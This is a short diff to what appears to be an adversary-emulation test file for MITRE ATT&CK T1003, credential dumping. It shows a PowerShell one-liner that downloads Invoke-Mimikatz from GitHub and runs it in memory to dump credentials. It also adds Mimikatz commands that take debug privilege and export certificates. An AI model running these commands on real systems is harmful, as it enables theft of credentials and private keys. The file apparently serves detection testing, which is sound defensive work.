@@ -3,12 +3,21 @@
 MITRE ATT&CK Technique: [T1003](https://attack.mitre.org/wiki/Technique/T1003)
 
 
-## Powershell Mimikatz
+## Powershell Mimikatz - Dump Credentials
 
 Input:
 
     powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
 
+## Powershell Mimikatz - Dump Certificates
+
+Input:
+
+    PS> Import-Module Invoke-Mimikatz.ps1 
+    Invoke-Mimikatz –command '"privilege::debug"' 
+    Invoke-Mimikatz –command '"crypto::capi"' 
+    Invoke-Mimikatz –command '"crypto::certificates /export"' 
+  
 ## Gsecdump
 
 [Gsecdump](https://www.truesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5)
